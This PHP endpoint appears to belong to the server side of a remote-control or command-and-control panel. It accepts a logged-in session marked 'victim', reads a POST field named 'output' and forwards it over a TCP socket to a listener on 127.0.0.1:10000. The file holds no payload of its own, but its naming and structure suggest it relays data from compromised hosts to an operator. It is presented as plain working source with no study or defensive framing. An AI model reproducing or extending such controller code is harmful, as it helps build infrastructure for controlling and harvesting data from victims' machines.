<?php
	include('../modules/utils.php');
	include('../modules/sessionManager.php');
	include('../modules/databaseManager.php');

	/*
	Function that carries the main feature in the script.
	Return true if the feature executed on success. Else return false.
	*/
	function run($databaseManager, $conn, $sessionManager){
		# Check if the session is already stored
		if($sessionManager->isCurrentSessionStored("victim")){
			if(isset($_POST['output'])){

                # Connection parameters
                $address = "127.0.0.1";
                $port = 10000;

                /*
                Create socket with:
                    AF_INET, meaning IPv4.
                    SOCK_STREAM, meaning stream of bytes, not datagrams on
                    transport layer.
                    SOL_TCP, meaning to use tcp on transport layer.
                */
                $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                if($sock === false) {
                    echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n";
                    # 500 Internal Server Error
                    http_response_code(500);
					return false;
                }

				# Try to connect to socket multiple times
				$result = socket_connect_loop($sock, $address, $port,
					SOCKET_RECONNECT_INTERVAL, SOCKET_RECONNECT_MAX_ATTEMPT_NUMBER, DEBUG);

                if ($result === false) {
                    echo "socket_connect() failed.\nReason: ($result) " . socket_strerror(socket_last_error($sock)) . "\n";
                    # 500 Internal Server Error
                    http_response_code(500);
					return false;
                }

                # Send command
                socket_write($sock, $_POST['output'], strlen($_POST['output']));

				# Close connection
                socket_close($sock);

            }

        }else{
            echo "Your user is not logged. First login, then enter this page.";
            // 401 Unauthorized
            http_response_code(401);
			return false;
        }

		return true;
	}

    function main(){
        # Connect to database
        $databaseManager = new DatabaseManager();
        $conn = $databaseManager->connectToDatabase();

		# Start session control
        $sessionManager = new SessionManager($conn);
        $sessionManager->startSessionControl();

		# Function that carries the main feature in the script
		run($databaseManager, $conn, $sessionManager);

        # Disconnect from database
        $databaseManager->disconnectFromDatabase();
    }

    main();

?>
